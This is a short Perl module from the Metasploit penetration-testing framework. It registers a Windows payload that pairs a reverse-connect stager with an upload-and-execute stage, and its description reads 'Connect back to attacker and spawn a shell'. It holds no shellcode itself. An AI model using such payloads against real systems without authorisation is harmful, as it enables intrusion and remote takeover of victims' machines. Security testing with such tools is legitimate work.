package Msf::Payload::win32_reverse_stg_upexec;
use strict;
use base 'Msf::PayloadComponent::Win32UploadExecStage';
sub load {
  Msf::PayloadComponent::Win32UploadExecStage->import('Msf::PayloadComponent::Win32ReverseStager');
}

my $info =
{
    'Name'         => 'winreverse_stg_upexec',
    'Version'      => '1.0',
    'Description'  => 'Connect back to attacker and spawn a shell',
    'Authors'      => [ 'H D Moore <hdm [at] metasploit.com> [Artistic License]', ],

};

sub new {
  load();
  my $class = shift;
  my $hash = @_ ? shift : { };
  $hash = $class->MergeHash($hash, {'Info' => $info});
  my $self = $class->SUPER::new($hash, @_);
  return($self);
}
